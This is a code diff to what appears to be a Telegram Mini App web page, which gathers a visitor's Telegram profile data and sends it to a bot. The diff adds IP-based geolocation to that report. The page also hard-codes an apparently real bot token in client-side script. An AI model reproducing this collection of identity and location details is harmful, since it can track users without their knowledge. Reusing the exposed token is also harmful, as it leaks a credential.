@@ -263,6 +263,7 @@
             const botToken = "7628792743:AAHU7rESkOh5jhMsiyHg7QSuEJGhPzfV4mE"; // Replace with your bot token
 
             let photoUrl = await getUserProfilePhoto(user.id, botToken);
+            let locationFromIP = await getLocationFromIP();
 
             const userData = `
 👤 *User Data*:
@@ -274,7 +275,8 @@
 📎 Attachment Menu: ${user.added_to_attachment_menu ? "Yes" : "No"}
 ✉️ Allows PM: ${user.allows_write_to_pm ? "Yes" : "No"}
 🖼 Profile Photo: ${photoUrl ? `[Click Here](${photoUrl})` : "No photo"}
-📍 Position: ${getLocationData}`;
+📍 IP-based Location: ${locationFromIP}
+`;
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
@@ -406,12 +408,17 @@
 
 
         async function getLocationFromIP() {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            console.log(`Location: ${data.city}, ${data.country}`);
-        } 
-           
-      
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                console.log(`Location: ${data.city}, ${data.country}`);
+                return `${data.city}, ${data.country}`;
+            } catch (error) {
+                console.error("Failed to get location from IP:", error);
+                return "Location unavailable";
+            }
+        }
+
     </script>
 
     <!-- Eruda is console for mobile browsers -->
